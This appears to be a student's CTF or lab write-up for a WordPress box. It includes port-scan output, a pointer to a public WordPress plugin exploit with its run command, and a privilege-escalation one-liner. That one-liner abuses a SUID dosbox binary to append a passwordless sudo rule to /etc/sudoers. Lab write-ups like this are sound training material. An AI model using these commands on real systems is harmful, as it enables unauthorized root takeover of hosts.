Linux ttl=61

# rustscan

```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 61
80/tcp    open  http    syn-ack ttl 61
36445/tcp open  unknown syn-ack ttl 61
```

# nmap

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-generator: WordPress 5.5.1
|_http-title: Retro Gamming &#8211; Just another WordPress site
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, Kerberos, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SIPOptions, SMBProgNeg, SSLSessionReq, TerminalServerCookie, WMSRequest: 
|_    Host '192.168.45.163' is not allowed to connect to this MariaDB server
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
|_http-title: 404 Not Found
13000/tcp open  http        nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
36445/tcp open  netbios-ssn Samba smbd 4.6.2
```

# initial

80 has wordpress site and usually people get `simple file list` plugin but i didn't got it so just looked at walkthrough

https://www.exploit-db.com/exploits/48979

usage is simple, just change IP & port and run it

```
python3 48979.py http://192.168.182.105/
```

----------

```
wpscan --url http://192.168.182.105/
```

using simple `wpscan` it showed up!

![[Pasted image 20240628025543.png]]
# priv esc

got www-data shell

![[Pasted image 20240628025205.png]]

got in as commander

![[Pasted image 20240628025234.png]]

dosbox SUID

```
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```